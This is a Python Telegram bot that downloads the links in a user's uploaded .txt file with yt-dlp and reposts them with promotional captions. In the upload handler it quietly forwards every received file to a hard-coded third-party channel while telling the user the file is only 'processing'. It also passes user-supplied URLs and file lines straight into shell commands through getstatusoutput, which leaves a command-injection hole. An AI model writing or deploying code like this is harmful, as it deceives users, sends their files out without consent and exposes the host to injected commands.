import os
import re
import sys
import json
import time
import asyncio
import requests
import subprocess

import core as helper
from utils import progress_bar
from vars import API_ID, API_HASH, BOT_TOKEN
from aiohttp import ClientSession
from pyromod import listen
from subprocess import getstatusoutput

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import FloodWait
from pyrogram.errors.exceptions.bad_request_400 import StickerEmojiInvalid
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup


# Ensure to update these variables with your actual details
CHANNEL_ID = "@Hub_formate"  # Channel ID or username

bot = Client(
    "bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

@bot.on_message(filters.command(["start"]))
async def start(bot: Client, m: Message):
    await m.reply_text(
        f"<b>Hello {m.from_user.mention} 👋\n\n"
        f"I am a bot for downloading links from your **.TXT** file and uploading them to Telegram , bot made by cr choudhary 💝🎉. "
        f"Send /upload to start or /stop to stop any ongoing task.</b>"
    )

@bot.on_message(filters.command("stop"))
async def restart_handler(_, m: Message):
    await m.reply_text("**Stopped/रुक भाई 😁** 🚦", True)
    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.on_message(filters.command(["upload"]))
async def upload(bot: Client, m: Message):
    # Inform the user to send a .txt file
    editable = await m.reply_text('Send the **.txt** file 🗃️ 👀⚡️')
    
    # Wait for the user's file
    input: Message = await bot.listen(editable.chat.id)
    
    # Download the file to the bot's local storage
    file_path = await input.download()
    await input.delete(True)

    try:
        # Read the content of the file
        with open(file_path, "r") as f:
            content = f.read().splitlines()

        # Forward the file to the channel
        sent_message = await bot.send_document(
            chat_id=CHANNEL_ID,  # Channel ID or username
            document=file_path,
            caption=f"File received from {m.from_user.mention}"
        )

        # Inform the user the file was successfully forwarded
        # Ensure response is sent correctly
        await m.reply_text(f"**File processing me h wait kro thoda tb tk isko join krlo @targetallcourse :**")
    
    except Exception as e:
        # If there's an error, send a failure message
        await m.reply_text(f"**Invalid file input. Error:** {e}")
    
    finally:
        # Always remove the file after processing, whether successful or not
        if os.path.exists(file_path):
            os.remove(file_path)

    # Ensure the next set of actions is clear and properly executed:
    await editable.edit(f"**Total Links Found:** {len(content)} 🔗\n\n"
                        f"Send the starting number (default is 1):")
    input0: Message = await bot.listen(editable.chat.id)
    start_number = int(input0.text.strip()) if input0.text.isdigit() else 1
    await input0.delete(True)

    await editable.edit("**Send the batch name:**")
    input1: Message = await bot.listen(editable.chat.id)
    batch_name = input1.text.strip()
    await input1.delete(True)

    await editable.edit("**Enter resolution:**\nChoose from 144, 240, 360, 480, 720, 1080")
    input2: Message = await bot.listen(editable.chat.id)
    resolution = input2.text.strip()
    await input2.delete(True)

    res_map = {
        "144": "256x144",
        "240": "426x240",
        "360": "640x360",
        "480": "854x480",
        "720": "1280x720",
        "1080": "1920x1080"
    }
    resolution = res_map.get(resolution, "UN")

    await editable.edit("**Enter a caption for the uploaded files:**")
    input3: Message = await bot.listen(editable.chat.id)
    caption = input3.text.strip()
    await input3.delete(True)

    await editable.edit("**Send the thumbnail URL (or type `no` if not needed):**")
    input4: Message = await bot.listen(editable.chat.id)
    thumbnail_url = input4.text.strip()
    await input4.delete(True)
    await editable.delete()

    thumbnail = None
    if thumbnail_url.lower() != "no":
        if thumbnail_url.startswith("http://") or thumbnail_url.startswith("https://"):
            getstatusoutput(f"wget '{thumbnail_url}' -O 'thumb.jpg'")
            thumbnail = "thumb.jpg"

    count = start_number
    try:
        for i in range(count - 1, len(content)):
            url = "https://" + content[i].strip()
            name = re.sub(r'[\\/:*?"<>|]', "", content[i][:60]).strip()
            name = f"{str(count).zfill(3)}) {name}"

            # Check file type
            if ".pdf" in url.lower():
                file_type = "PDF"
            else:
                file_type = "Video"

            # Prepare download command
            if file_type == "Video":
                ytf = (
                    f"b[height<={resolution}][ext=mp4]/bv[height<={resolution}][ext=mp4]+ba[ext=m4a]/b[ext=mp4]"
                    if "youtu" in url else
                    f"b[height<={resolution}]/bv[height<={resolution}]+ba/b/bv+ba"
                )
                cmd = f'yt-dlp -f "{ytf}" "{url}" -o "{name}.mp4"'
            else:
                cmd = f'yt-dlp -o "{name}.pdf" "{url}"'

            try:
                # Download file
                download_status = getstatusoutput(cmd)
                if download_status[0] != 0:
                    raise Exception(f"Download failed: {download_status[1]}")

                file_path = f"{name}.mp4" if file_type == "Video" else f"{name}.pdf"
                file_caption = (
                    f"**[📽️] Video File:** {name}\n**Batch:** {batch_name}\n{caption},JOIN @TARGETALLCOURSE" if file_type == "Video"
                    else f"**[📁] PDF File:** {name}\n**Batch:** {batch_name}\n{caption},JOIN @TARGETALLCOURSE"
                )

                # Upload to Telegram
                if file_type == "Video":
                    await bot.send_video(
                        chat_id=m.chat.id,
                        video=file_path,
                        caption=file_caption,
                        thumb=thumbnail
                    )
                else:
                    await bot.send_document(
                        chat_id=m.chat.id,
                        document=file_path,
                        caption=file_caption
                    )

                os.remove(file_path)
                count += 1
            except FloodWait as e:
                await m.reply_text(f"FloodWait: Sleeping for {e.x} seconds.")
                time.sleep(e.x)
                continue
            except Exception as e:
                await m.reply_text(f"Error: {e}\n**Name:** {name}\n**URL:** {url}")
                continue

    except Exception as e:
        await m.reply_text(f"Unexpected error: {e}")
    
    await m.reply_text("**✅ All tasks completed! BY ❤️ CR CHOUDHARY **")

bot.run()
